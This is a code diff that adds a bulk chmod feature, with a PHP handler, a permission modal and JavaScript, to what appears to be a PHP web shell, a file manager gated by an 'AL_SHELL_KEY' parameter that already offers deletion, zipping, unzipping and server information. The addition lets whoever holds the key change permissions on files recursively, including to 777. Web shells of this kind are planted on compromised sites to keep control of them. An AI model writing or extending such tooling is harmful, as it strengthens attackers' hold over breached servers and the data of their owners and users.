@@ -588,6 +588,92 @@ if (isset($_POST['action']) && $_POST['action'] === 'delete_selected' && !empty(
     header("Location: ?masuk=" . AL_SHELL_KEY . "&d=" . urlencode($dir));
     exit;
 }
+if (isset($_POST['action']) && $_POST['action'] === 'chmod_bulk' && !empty($_POST['selected_files'])) {
+    header('Content-Type: application/json');
+    $permission = $_POST['chmod_perm'] ?? '644';
+    $recursive = isset($_POST['chmod_recursive']) && $_POST['chmod_recursive'] === '1';
+    
+    $results = [
+        'success' => true,
+        'total' => 0,
+        'success_count' => 0,
+        'failed_count' => 0,
+        'processed' => [],
+        'errors' => []
+    ];
+    
+    // Function to recursively chmod
+    function chmod_recursive($path, $permission, &$results) {
+        if (!file_exists($path)) {
+            $results['errors'][] = 'Not found: ' . basename($path);
+            $results['failed_count']++;
+            return false;
+        }
+        
+        $success = @chmod($path, octdec($permission));
+        $results['processed'][] = [
+            'path' => $path,
+            'type' => is_dir($path) ? 'dir' : 'file',
+            'success' => $success
+        ];
+        
+        if ($success) {
+            $results['success_count']++;
+        } else {
+            $results['errors'][] = 'Failed: ' . basename($path);
+            $results['failed_count']++;
+        }
+        $results['total']++;
+        
+        // If directory and recursive, process children
+        if ($success && is_dir($path)) {
+            $items = @scandir($path);
+            if ($items) {
+                foreach ($items as $item) {
+                    if ($item === '.' || $item === '..') continue;
+                    $childPath = $path . DIRECTORY_SEPARATOR . $item;
+                    chmod_recursive($childPath, $permission, $results);
+                }
+            }
+        }
+        
+        return $success;
+    }
+    
+    // Process each selected file/folder
+    foreach ($_POST['selected_files'] as $file) {
+        $targetPath = $dir . DIRECTORY_SEPARATOR . basename($file);
+        
+        if ($recursive && is_dir($targetPath)) {
+            // Recursive chmod for directory
+            chmod_recursive($targetPath, $permission, $results);
+        } else {
+            // Single item chmod
+            if (file_exists($targetPath)) {
+                $success = @chmod($targetPath, octdec($permission));
+                $results['processed'][] = [
+                    'path' => $targetPath,
+                    'type' => is_dir($targetPath) ? 'dir' : 'file',
+                    'success' => $success
+                ];
+                if ($success) {
+                    $results['success_count']++;
+                } else {
+                    $results['errors'][] = 'Failed: ' . basename($targetPath);
+                    $results['failed_count']++;
+                }
+                $results['total']++;
+            } else {
+                $results['errors'][] = 'Not found: ' . basename($targetPath);
+                $results['failed_count']++;
+                $results['total']++;
+            }
+        }
+    }
+    
+    echo json_encode($results);
+    exit;
+}
 if (isset($_POST['action']) && $_POST['action'] === 'unzip_file' && !empty($_POST['unzip_target'])) {
     $targetFile = $dir . DIRECTORY_SEPARATOR . basename($_POST['unzip_target']);
     $zip = new ZipArchive;
@@ -1660,7 +1746,7 @@ function list_dir($path) {
     $files = @scandir($path);
     if (!$files) return '<div class="error">Cannot open directory</div>';
     
-    $html = "<div class='file-actions'><button id='zipSelectedBtn' disabled>Zip Selected</button> <button id='deleteSelectedBtn' disabled style='background: #d32f2f; color: white;'>Delete Selected</button></div>";
+    $html = "<div class='file-actions'><button id='zipSelectedBtn' disabled>Zip Selected</button> <button id='chmodSelectedBtn' disabled style='background: #ff9800; color: #111;'>Chmod Bulk</button> <button id='deleteSelectedBtn' disabled style='background: #d32f2f; color: white;'>Delete Selected</button></div>";
     $html .= "<table class='file-table' data-sort-col='2' data-sort-dir='asc'><thead><tr>";
     $html .= "<th><input type='checkbox' id='selectAll'></th>";
     $html .= "<th></th>";
@@ -2102,6 +2188,55 @@ function list_dir($path) {
                 <button type="button" onclick="closeModal('confirmDeleteModal')">Cancel</button>
             </div>
         </form>
+    </div>
+</div>
+<!-- Chmod Bulk Modal -->
+<div class="modal" id="chmodBulkModal">
+    <div class="modal-content" style="max-width: 500px;">
+        <div class="modal-header">
+            <h3>🔧 Chmod Bulk</h3>
+        </div>
+        <div style="padding: 15px;">
+            <p style="margin: 0 0 10px 0; font-size: 12px; color: #888;">
+                Selected items: <span id="chmodBulkCount" style="color: #0f0; font-weight: bold;">0</span>
+            </p>
+            
+            <label style="font-size: 12px; color: #888; display: block; margin-bottom: 5px;">Permission:</label>
+            <select id="chmodBulkPerm" style="width: 100%; margin-bottom: 15px; padding: 8px; background: #222; color: #0f0; border: 1px solid #0f0;">
+                <option value="755">755 (rwxr-xr-x) - Executable</option>
+                <option value="644" selected>644 (rw-r--r--) - Standard File</option>
+                <option value="777">777 (rwxrwxrwx) - Full Access</option>
+                <option value="600">600 (rw-------) - Private</option>
+                <option value="750">750 (rwxr-x---) - Restricted</option>
+                <option value="custom">Custom...</option>
+            </select>
+            
+            <div id="chmodBulkCustomDiv" style="display: none; margin-bottom: 15px;">
+                <label style="font-size: 12px; color: #888; display: block; margin-bottom: 5px;">Custom (e.g., 755, u+rwx):</label>
+                <input type="text" id="chmodBulkCustomInput" placeholder="755" style="width: 100%; padding: 8px; background: #222; color: #0f0; border: 1px solid #0f0;">
+            </div>
+            
+            <label style="font-size: 12px; color: #888; display: flex; align-items: center; cursor: pointer;">
+                <input type="checkbox" id="chmodBulkRecursive" style="margin-right: 8px;">
+                <span>🔁 Recursive (apply to all files/subfolders inside selected folders)</span>
+            </label>
+            
+            <div id="chmodBulkProgress" style="display: none; margin-top: 15px; padding: 10px; background: #111; border: 1px solid #333; border-radius: 4px;">
+                <div style="font-size: 11px; color: #888; margin-bottom: 5px;">
+                    Progress: <span id="chmodBulkCurrent" style="color: #0f0;">0</span> / <span id="chmodBulkTotal">0</span>
+                </div>
+                <div style="height: 4px; background: #333; border-radius: 2px; overflow: hidden;">
+                    <div id="chmodBulkProgressBar" style="height: 100%; background: linear-gradient(90deg, #0f0, #6cf); width: 0%; transition: width 0.3s;"></div>
+                </div>
+                <div id="chmodBulkStatus" style="font-size: 10px; color: #6cf; margin-top: 5px;">Initializing...</div>
+            </div>
+            
+            <div id="chmodBulkResults" style="display: none; margin-top: 15px; max-height: 150px; overflow-y: auto; font-size: 11px; font-family: monospace; background: #000; padding: 10px; border: 1px solid #333; border-radius: 4px;"></div>
+        </div>
+        <div class="modal-footer">
+            <button id="chmodBulkExecuteBtn" onclick="executeChmodBulk()" style="background: #ff9800; color: #111; font-weight: bold;">🚀 Execute</button>
+            <button type="button" onclick="closeModal('chmodBulkModal')" id="chmodBulkCloseBtn">Cancel</button>
+        </div>
     </div>
 </div>
 <div class="modal" id="serverInfoModal">
@@ -2668,12 +2803,14 @@ document.addEventListener('click', function(e) {
     }
 });
 const zipBtn = document.getElementById('zipSelectedBtn');
+const chmodBulkBtn = document.getElementById('chmodSelectedBtn');
 const deleteBtn = document.getElementById('deleteSelectedBtn');
 const selectAllCheckbox = document.getElementById('selectAll');
 document.addEventListener('change', function(e) {
     if (e.target.classList.contains('file-select')) {
         const anyChecked = document.querySelectorAll('.file-select:checked').length > 0;
         zipBtn.disabled = !anyChecked;
+        chmodBulkBtn.disabled = !anyChecked;
         deleteBtn.disabled = !anyChecked;
     }
 });
@@ -2683,6 +2820,7 @@ selectAllCheckbox.addEventListener('change', function() {
     // Update button state directly
     const anyChecked = this.checked && checkboxes.length > 0;
     zipBtn.disabled = !anyChecked;
+    chmodBulkBtn.disabled = !anyChecked;
     deleteBtn.disabled = !anyChecked;
 });
 zipBtn.addEventListener('click', function() {
@@ -2701,6 +2839,140 @@ deleteBtn.addEventListener('click', function() {
         formData.append('action', 'delete_selected');
         checkboxes.forEach(cb => formData.append('selected_files[]', cb.value));
         fetch('', { method: 'POST', body: formData }).then(() => window.location.reload());
+    }
+});
+chmodBulkBtn.addEventListener('click', function() {
+    const checkboxes = document.querySelectorAll('.file-select:checked');
+    if (checkboxes.length === 0) return;
+    
+    // Update count in modal
+    document.getElementById('chmodBulkCount').textContent = checkboxes.length;
+    
+    // Reset modal state
+    document.getElementById('chmodBulkProgress').style.display = 'none';
+    document.getElementById('chmodBulkResults').style.display = 'none';
+    document.getElementById('chmodBulkExecuteBtn').disabled = false;
+    document.getElementById('chmodBulkExecuteBtn').textContent = '🚀 Execute';
+    document.getElementById('chmodBulkCloseBtn').textContent = 'Cancel';
+    
+    openModal('chmodBulkModal');
+});
+
+// Chmod Bulk execute function
+async function executeChmodBulk() {
+    const checkboxes = document.querySelectorAll('.file-select:checked');
+    const permission = document.getElementById('chmodBulkPerm').value === 'custom' 
+        ? document.getElementById('chmodBulkCustomInput').value 
+        : document.getElementById('chmodBulkPerm').value;
+    const recursive = document.getElementById('chmodBulkRecursive').checked;
+    
+    if (!permission) {
+        alert('Please enter a permission value');
+        return;
+    }
+    
+    // UI updates
+    const executeBtn = document.getElementById('chmodBulkExecuteBtn');
+    const closeBtn = document.getElementById('chmodBulkCloseBtn');
+    const progressDiv = document.getElementById('chmodBulkProgress');
+    const resultsDiv = document.getElementById('chmodBulkResults');
+    const progressBar = document.getElementById('chmodBulkProgressBar');
+    const currentSpan = document.getElementById('chmodBulkCurrent');
+    const totalSpan = document.getElementById('chmodBulkTotal');
+    const statusDiv = document.getElementById('chmodBulkStatus');
+    
+    executeBtn.disabled = true;
+    executeBtn.textContent = '⏳ Processing...';
+    closeBtn.textContent = 'Running...';
+    progressDiv.style.display = 'block';
+    resultsDiv.style.display = 'block';
+    resultsDiv.innerHTML = '<div style="color:#6cf">🚀 Starting chmod bulk operation...</div>';
+    
+    const files = Array.from(checkboxes).map(cb => cb.value);
+    
+    try {
+        const formData = new FormData();
+        formData.append('action', 'chmod_bulk');
+        formData.append('chmod_perm', permission);
+        formData.append('chmod_recursive', recursive ? '1' : '0');
+        files.forEach(f => formData.append('selected_files[]', f));
+        
+        statusDiv.textContent = 'Sending request...';
+        
+        const response = await fetch('', { method: 'POST', body: formData });
+        const data = await response.json();
+        
+        if (data.success) {
+            totalSpan.textContent = data.total;
+            currentSpan.textContent = data.total;
+            progressBar.style.width = '100%';
+            
+            // Build results
+            let html = '';
+            html += '<div style="margin-bottom:10px;padding:5px;background:#1a1a1a;border-radius:4px;">';
+            html += '<span style="color:#0f0">✅ Success: ' + data.success_count + '</span> | ';
+            html += '<span style="color:#f44">❌ Failed: ' + data.failed_count + '</span> | ';
+            html += '<span style="color:#888">Total: ' + data.total + '</span>';
+            html += '</div>';
+            
+            // Show processed items (limited to first 50)
+            const displayItems = data.processed.slice(0, 50);
+            displayItems.forEach(item => {
+                const icon = item.type === 'dir' ? '📁' : '📄';
+                const color = item.success ? '#0f0' : '#f44';
+                const status = item.success ? '✓' : '✗';
+                html += '<div style="margin:2px 0;font-size:10px;">';
+                html += '<span style="color:' + color + '">' + status + '</span> ';
+                html += icon + ' ' + escapeHtml(item.path.split('/').pop());
+                html += '</div>';
+            });
+            
+            if (data.processed.length > 50) {
+                html += '<div style="color:#888;font-size:10px;margin-top:5px;">... and ' + (data.processed.length - 50) + ' more items</div>';
+            }
+            
+            // Show errors if any
+            if (data.errors.length > 0) {
+                html += '<div style="margin-top:10px;padding:5px;background:#2a0000;border-radius:4px;">';
+                html += '<div style="color:#f44;font-weight:bold;margin-bottom:5px;">Errors:</div>';
+                data.errors.slice(0, 10).forEach(err => {
+                    html += '<div style="color:#f88;font-size:10px;">• ' + escapeHtml(err) + '</div>';
+                });
+                if (data.errors.length > 10) {
+                    html += '<div style="color:#888;font-size:10px;">... and ' + (data.errors.length - 10) + ' more errors</div>';
+                }
+                html += '</div>';
+            }
+            
+            resultsDiv.innerHTML = html;
+            statusDiv.innerHTML = '<span style="color:#0f0">✅ Completed!</span>';
+            
+            executeBtn.textContent = '✅ Done';
+            closeBtn.textContent = 'Close';
+            
+            // Refresh page after 2 seconds if successful
+            if (data.failed_count === 0) {
+                setTimeout(() => window.location.reload(), 2000);
+            }
+        } else {
+            throw new Error('Server returned error');
+        }
+    } catch (error) {
+        resultsDiv.innerHTML = '<div style="color:#f44">❌ Error: ' + escapeHtml(error.message) + '</div>';
+        statusDiv.innerHTML = '<span style="color:#f44">❌ Failed</span>';
+        executeBtn.disabled = false;
+        executeBtn.textContent = '🚀 Retry';
+        closeBtn.textContent = 'Close';
+    }
+}
+
+// Chmod bulk permission select change
+document.getElementById('chmodBulkPerm').addEventListener('change', function() {
+    const customDiv = document.getElementById('chmodBulkCustomDiv');
+    if (this.value === 'custom') {
+        customDiv.style.display = 'block';
+    } else {
+        customDiv.style.display = 'none';
     }
 });
 function unzipFile(fileName) {
